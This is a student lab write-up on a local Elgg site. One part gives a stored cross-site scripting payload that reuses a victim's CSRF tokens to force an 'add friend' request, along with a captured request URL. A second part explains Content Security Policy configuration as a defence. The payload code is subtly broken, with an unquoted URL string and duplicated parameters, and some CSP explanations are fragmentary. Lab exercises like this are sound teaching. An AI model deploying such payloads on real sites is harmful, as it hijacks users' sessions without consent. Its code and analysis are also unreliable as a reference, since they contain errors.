Task 4 \- A.C., C.C \- Becoming the victim’s friend (15 points)

**Question 1:** Line 1 retrieves the timestamp from the Elgg security token (elgg.security.token.\_\_elgg.ts). This timestamp is a security measure to prevent cross-site request forgery attacks. It ensures that the request is recent and not being replayed from a previous interaction. Line 2 retrieves the security token from elgg.security.token.\_\_elgg\_token. This token is another part of Elgg’s cross-site request forgery protection mechanism. It needs to be included in requests to prove that the request was made from a trustworthy source within the application. Including this token ensures that only authorized requests are accepted by the user.

**Question 2:** If the Elgg application only provides the Editor mode for the “About Me” field, and Text mode cannot be accessed, it becomes more challenging to launch a successful attack. Typically, in Text mode, you have more control over the content and can directly insert scripts without any additional HTML tags added by the editor. Without Text mode, you would have to find a way to inject your JavaScript code within the constraints of the editor’s HTML output. This could involve finding specific HTML tags or attributes that your code could exploit. However, if the editor sanitizes or restricts certain HTML tags or attributes, it might prevent successful injection of code.

The code below is placed into the about me section of Samy's profile, it must also be placed in the html editor instead of the plaintext editor. 

![][image10]

`<script type="text/javascript">`  
`window.onload = function () {`  
  `var Ajax=null;`

  `var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;`  
  `var token="&__elgg_token="+elgg.security.token.__elgg_token;`

  `//Construct HTTP request`  
  `var sendurl=http://www.seed-server.com/action/friends/add?friend=59 + ts + token + ts + token;`

  `//Request - http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1711908220&__elgg_token=xQ3KgOHcVsK8i5-GU6R_xA&__elgg_ts=1711908220&__elgg_token=xQ3KgOHcVsK8i5-GU6R_xA`

  `//Create and send Ajax request`   
  `Ajax=new XMLHttpRequest();`  
  `Ajax.open("GET", sendurl, true);`  
  `Ajax.send();`  
`}`  
`</script>`  
The sendurl variable is acquired from the HTTP Header Live tool. When we add Samy as a friend through legitimate means, we can see an add friend action which is what the sendurl variable should end up looking like in our script. 

![][image11]

When we fully write this url out we receive:  
http://www.seed-server.com/action/friends/add?friend=59&\_\_elgg\_ts=1711908220&\_\_elgg\_token=xQ3KgOHcVsK8i5-GU6R\_xA&\_\_elgg\_ts=1711908220&\_\_elgg\_token=xQ3KgOHcVsK8i5-GU6R\_xA

Once our script is written on Samy's about me section. We can go over to Charlie’s account and make sure that Samy is not a friend. After making sure this is true we can visit Samy's page, initially the button still says "add friend" but after refreshing the page we can confirm that Samy is now our friend. We can also double check this by looking at the HTTP Header live tool to see our add friend action.

Task 7 \- Defeating XXS Attacks using CSP \- Connor Lariviere

7.1. \- Investigating the Web Pages  
![][image16]  
This HTML code controls the website. It is identical for example32a, b, and c. It features six areas that each initialize with red text saying “Failed”. It also features a button that attempts to execute a JS script when clicked. To change the red ‘Failed’ text to a green ‘OK’ text, the program runs scripts to draw green OK text from different places. Depending on the CSP’s of each of the websites, certain requests will be blocked or accepted. The first three scripts utilize Nonce( or lack thereof), the fourth script draws from a local script, and the fifth and sixth take in scripts from [www.example60.com](http://www.example60.com) and [www.example70.com](http://www.example70.com) respectively.  
7.2 \- Setting CSPs  
There are two ways to set and edit CSPs: Through the Apache configuration file and through a web application.  
Apache Config \- Apache can set headers, so it can also set CSPs. Let’s examine the Apache file to see what it does.  
![][image17]  
![][image18]  
This file controls the CSPs for each example website. You can choose to set header options within the \</VirtualHost\> for each website. Default-src is the general parameter that all \-src’s will follow unless specified otherwise. Any sources mentioned in the CSP are allowed to be valid sources for external data. There are many specific settings for where the website can retrieve different types of data. In this file, ‘script-src’ is used, which controls external scripts. 

Now, let’s look at the web application method, which in this case is through a .php file.  
![][image19]  
The options are the same, however the syntax is different. You are essentially inserting the header through the php file.  
7.3- Questions  
**Q1 and Q2** \- In the first part of the task, we are taking a look at the example32(a|b|c|) websites and making observations on what runs and what doesn't, describing what happens when these websites are visited.  
![][image20]  
First up, website A. Every check succeeds on this site. The button, when clicked, successfully provides the alert saying that the JavaScript has been run. To find out why, we look at 32a’s section in the Apache configuration file.  
![][image21]  
As you can see, everything functions because there are no settings preventing scripts from a certain source.

![][image22]  
This is the view of website B. Most prompts fail, and when the button is clicked, no alert appears, meaning that the JavaScript did not run. When we investigate the Apache config file, we find our answer.  
![][image23]  
In this file, we see that there has been a CSP set so that the website only accepts code from itself, however it will accept script code from only example70. Since only area 5, which draws from ‘self’, and area 6, which draws from the allowed example70.  
![][image24]  
For website C, only area 1, area 4, and area 6 pass. The button does not produce an alert, meaning the JavaScript code does not trigger. Looking at the config file, we see that it links to a file called phpindex.php . ![][image25]  
Looking at the file phpindex.php, we find that it acts as the Header for the website.  
![][image26]  
This file sets the same CPSs as example B, but with the added permission of scripts to be accepted from ‘nonce-111-111-111’.

**Q3.** Change the config on example32b so Areas 5 and 6 display OK![][image27]  
As you can see, only Areas 5 and 6 display OK. I accomplished this by removing the ‘self’ tag from script-src, and adding \*.example60.com to script-src. This makes it so the website will not accept local scripts and will only accept scripts from [www.example70.com](http://www.example70.com) and [www.example60.com](http://www.example60.com) .  
![][image28]

**Q4.**Change the config on example32c so Areas 1, 2, 4, 5 and 6 display OK![][image29]  
In this example, areas 1,2,4,5,6 are marked OK. To accomplish this, I added ‘nonce-222-222-222’ and \*.example60.com.  
![][image30]

Q5. Essentially, a good CSP requires that all scripts and all executable code comes from trusted and verifiable sources, making it significantly harder to inject unwanted code into a website. By restricting the resources available to a webpage, compromising it becomes more difficult.
